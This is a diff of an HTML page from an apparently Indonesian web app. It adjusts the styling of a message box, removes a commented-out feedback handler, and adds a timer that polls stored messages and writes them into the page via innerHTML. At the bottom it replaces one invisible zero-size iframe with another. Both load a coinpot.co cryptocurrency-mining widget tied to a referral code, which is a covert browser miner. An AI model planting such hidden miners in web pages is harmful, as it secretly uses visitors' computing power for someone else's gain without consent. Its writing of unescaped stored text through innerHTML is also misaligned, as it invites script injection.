@@ -139,6 +139,8 @@
         #textmasukan {
             height: 200px;
             padding: 10px;
+            overflow: scroll;
+            text-align: justify;
         }
         
         .gmd {
@@ -177,11 +179,6 @@
             margin-left: 95px;
         }
         
-        #textmasukanloading {
-            display: none;
-            width: 70px;
-        }
-        
         .close {
             position: absolute;
             transform: translate(240px, -25px);
@@ -197,7 +194,6 @@
             <h3 class="close">X</h3>
             <h3>Kotak Pesan</h3>
             <div name="textmasukan" id="textmasukan">Tidak ada pesan untuk Anda</div>
-            <img id="textmasukanloading" src="./image/Pulse.svg" alt="loading">
         </div>
     </div>
     <div class="wrapterkirim gmd backform">
@@ -253,12 +249,10 @@
         let logoutButton = document.querySelector(".logoutButton");
         let wrapbody = document.querySelector(".wrapbody");
         let masukan = document.querySelector(".masukan");
-        //let btnMasukan = document.querySelector("#btnMasukan");
         let boxmasukan = document.querySelector(".boxmasukan");
         let textmasukan = document.querySelector("#textmasukan");
         let wrapterkirim = document.querySelector(".wrapterkirim");
         let tutup = document.querySelector("#tutup");
-        let textmasukanloading = document.querySelector("#textmasukanloading");
         let loading = document.querySelector(".loading");
         let akun = document.querySelector('.akun');
         let close = document.querySelector('.close');
@@ -313,34 +307,22 @@
         masukan.addEventListener('click', () => {
             boxmasukan.setAttribute('style', 'display:block');
         });
-        /*
-                btnMasukan.addEventListener('click', () => {
 
-                    let dataku = {
-                        username: JSON.parse(main.ambilDb("db")).nip,
-                        masukan: textmasukan.value
-                    }
-
-                    async function masukan() {
-                        textmasukanloading.setAttribute("style", "display:inline-block");
-                        await main.kirimdata(dataku);
-                        boxmasukan.setAttribute('style', 'display:none');
-                        wrapterkirim.setAttribute("style", "display:block");
-                    };
-
-                    masukan();
-                });   
-                
-                tutup.addEventListener('click', () => {
-                    wrapterkirim.setAttribute('style', 'display:none');
-                });
-         */
+        window.addEventListener('load', () => {
+            setInterval(function bacaPesan() {
+                //console.log(main.ambilDb('pesan'));
+                main.bacaPesan();
+                if (btoa(JSON.parse(main.ambilDb('pesan'))) !== btoa(textmasukan.innerHTML)) {
+                    textmasukan.innerHTML = JSON.parse(main.ambilDb('pesan'));
+                }
+            }, 3000)
+        })
 
         mendaftarBtn.addEventListener('click', () => {
             location.assign('pendaftaran.html');
         });
     </script>
-    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/litecoin/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0px;height:0px;"></iframe>
+    <iframe scrolling="no" frameborder="0" src="https://coinpot.co/mine/bitcoincore/?ref=0C052766283C&mode=widget" style="overflow:hidden;width:0;height:0;"></iframe>
 </body>
 
 </html>
